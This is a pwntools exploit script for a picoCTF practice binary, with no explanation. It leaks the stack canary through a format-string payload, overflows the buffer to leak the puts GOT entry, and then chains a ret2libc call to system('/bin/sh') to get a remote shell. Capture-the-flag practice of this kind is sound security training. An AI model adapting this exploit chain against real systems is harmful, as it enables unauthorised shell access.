# Example
ret2libc
```python
from pwn import *

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])

    else:
        r = remote("jupiter.challenges.picoctf.org", 15815)

    return r

def main():

    r = conn()
    # r = gdb.debug(exe.path, '''
    #     break *0x080487e9
    #     continue
    #     ''')

    if args.LOCAL:
        fixed_random = -2495

    else:
        fixed_random = -3727

    stage1(r, fixed_random)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    canary_stack_cookie_str = stage2_getCanary(r)

    stage1(r, fixed_random)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    puts_got_context = stage2_getGOT(r, canary_stack_cookie_str)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    stage2_invokeShell(r, canary_stack_cookie_str, puts_got_context)

    r.interactive()

def stage1(r, fixed_random):
    print("[DEBUG] ------- stage1 -------")

    print(r.recvuntil(b'like to guess?'))

    payload = str(fixed_random).encode()

    r.sendline(payload)
    print("stdin  : ", payload)

    res = r.recvline()
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)

    if b'Nope' in res:
        print("[DEBUG] No Hit!!!")
        exit()
    else:
        print("[DEBUG] Hit!!!!!!")

def stage2_getCanary(r):
    print("[DEBUG] ------- stage2_getCanary -------")

    payload = b"%135$x"
    r.sendline(payload)
    print("stdin  : ", payload)

    res = r.recvuntil(b"Congrats: ")
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)

    canary_str=str(res) # str: b'fdc8cf00\n'
    return canary_str[2:-3] # str: fdc8cf00

def stage2_getGOT(r, canary_stack_cookie_str):
    print("[DEBUG] ------- stage2_checkGOT -------")

    decimal_int = int(canary_stack_cookie_str, 16)

    payload2 = b"A" * 4 * 128 + p32(decimal_int)

    payload_canary_cookie_to_ret = b"B" * 4 * 3

    payload2 += payload_canary_cookie_to_ret

    puts_plt = exe.plt['puts']
    puts_got = exe.got['puts']
    # puts_return_address = exe.functions['win'].address
    # puts_plt = 0x080484c0
    # puts_got = 0x08049fdc
    puts_return_address = 0x0804876e

    print("puts_plt : ", puts_plt, " ", p32(puts_plt))
    print("puts_got : ", puts_got, " ", p32(puts_got))

    payload2 += p32(puts_plt) + p32(puts_return_address) + p32(puts_got)

    r.sendline(payload2)
    print("stdin  : ", payload2)

    res = r.recvline()
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)
    res = r.recvline()
    print("stdout : ", res)

    puts_got_context = res[0:4]
    print("[DEBUG] puts_got_context: ", puts_got_context)
    print("[DEBUG] puts_got_context: ", hex(u32(puts_got_context)))

    return puts_got_context

def stage2_invokeShell(r, canary_stack_cookie_str, puts_got_context):
    print("[DEBUG] ------- stage2_invokeShell -------")

    decimal_int = int(canary_stack_cookie_str, 16)

    payload2 = b"A" * 4 * 128 + p32(decimal_int)

    payload_canary_cookie_to_ret = b"B" * 4 * 3

    payload2 += payload_canary_cookie_to_ret

    if args.LOCAL:
        # got_plt > puts 0xf7dca2a0
        # libc6_2.35-0ubuntu3.5_i386
        # c.f. https://libc.blukat.me/?q=puts%3A0xf7dca2a0&l=libc6_2.35-0ubuntu3.5_i386
        offset_str_bin_sh = 0x149e35
        offset_system = -0x2b130
    else:
        # got_plt > puts 0xf7e4b560
        # libc6-i386_2.27-3ubuntu1.5_amd64
        # c.f. https://libc.blukat.me/?q=puts%3A0xf7e4b560&l=libc6-i386_2.27-3ubuntu1.5_amd64
        offset_str_bin_sh = 0x11447b
        offset_system = -0x2a650

    puts_return_address = 0x0804876e

    print("[DEBUG] ", hex(u32(puts_got_context) + offset_system))
    print("[DEBUG] ", hex(puts_return_address))
    print("[DEBUG] ", hex(u32(puts_got_context) + offset_str_bin_sh))

    payload2 += p32(u32(puts_got_context) + offset_system)
    payload2 += p32(puts_return_address)
    payload2 += p32(u32(puts_got_context) + offset_str_bin_sh)

    r.sendline(payload2)
    print("stdin  : ", payload2)

if __name__ == "__main__":
    main()

```